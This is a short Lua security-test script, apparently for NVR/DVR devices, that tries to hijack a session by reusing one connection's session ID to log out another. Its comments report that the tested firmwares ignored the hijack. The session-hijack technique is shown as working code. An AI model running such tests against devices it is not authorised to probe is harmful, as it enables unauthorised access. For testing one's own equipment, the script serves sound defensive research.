-- R10-SessionHijack.lua

--[[
Attempts to hijack a session from another session, using the SessionIDs

Opens two sessions with a distinct SessionID each, then tries to log out of 1st session using 2nd session's ID.
To verify that a logout was performed, channel list is then requested from both sessions using their original IDs.

Tested on firmwares:
	- V4.03.R11.J5980233.12201.140000.0000001 (NVR)
	- V4.03.R11.C638014A.12201.142300.0000000 (DVR-test)
		No error reported for the wrong logout, and the logout seems to be ignored, channel list is received
		normally afterwards. So the hijack doesn't go through and is silently ignored.
--]]





local nvr = require("Nvr")

-- The specific real device's configuration, provide your own as needed (there's a RealDeviceConfig.sample.lua)
local config = require("RealDeviceConfig")

print("Creating two connections...")
local conn1 = assert(nvr.connect(config.hostName, config.port))
assert(conn1:login(config.username, config.passwordHash))
local conn2 = assert(nvr.connect(config.hostName, config.port))
assert(conn2:login(config.username, config.passwordHash))

local sessionID1 = conn1.mSessionID
local sessionID2 = conn2.mSessionID
print("Connection 1 Session ID = " .. sessionID1)
print("Connection 2 Session ID = " .. sessionID2)
assert(sessionID1 ~= sessionID2) -- If we're given the same session IDs, there's no way to test the hijacking

-- Logout of the first conn:
print("Logging out of conn 1 using conn 2 with fake SessionID...")
conn2.mSessionID = sessionID1
conn2:logout()
conn2.mSessionID = sessionID2

-- Request channel list on both connections:
print("Requesting channel titles on conn 2...")
print(assert(conn2:enumChannelTitles()))
print("Requesting channel titles on conn 1...")
print(assert(conn1:enumChannelTitles()))

print("All done.")
